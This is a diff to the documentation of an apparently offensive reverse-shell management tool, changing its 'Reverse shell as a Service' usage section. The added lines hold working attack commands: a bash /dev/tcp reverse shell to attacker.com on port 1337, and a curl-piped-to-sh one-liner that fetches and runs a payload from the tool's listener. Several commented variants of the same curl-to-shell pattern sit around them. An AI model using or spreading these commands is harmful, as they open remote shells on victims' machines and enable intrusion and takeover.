@@ -69,10 +69,21 @@ exit
 
 #### Reverse shell as a Service
 ```bash
-# victim will be redirected to attacker-host attacker-port
-sh -c "$(curl http://host:port/attacker-host/attacker-port)"
-# if the attacker info not specified, it will use host, port as attacker-host attacker-port
-sh -c "$(curl http://host:port/)"
+// Platypus is able to multiplexing the reverse shell listening port
+// The port 8080 can receive reverse shell client connection
+// Also these is a Reverse shell as a service running on this port
+
+// victim will be redirected to attacker-host attacker-port
+// sh -c "$(curl http://host:port/attacker-host/attacker-port)"
+# curl http://192.168.159.1:8080/attacker.com/1337
+bash -c 'bash -i >/dev/tcp/attacker.com/1337 0>&1'
+# sh -c "$(curl http://192.168.159.1:8080/attacker.com/1337)"
+
+// if the attacker info not specified, it will use host, port as attacker-host attacker-port
+// sh -c "$(curl http://host:port/)"
+# curl http://192.168.1.2:8080/
+curl http://192.168.1.2:8080/192.168.1.2/8080|sh
+# sh -c "$(curl http://host:port/)"
 ```
 
 #### RESTful API
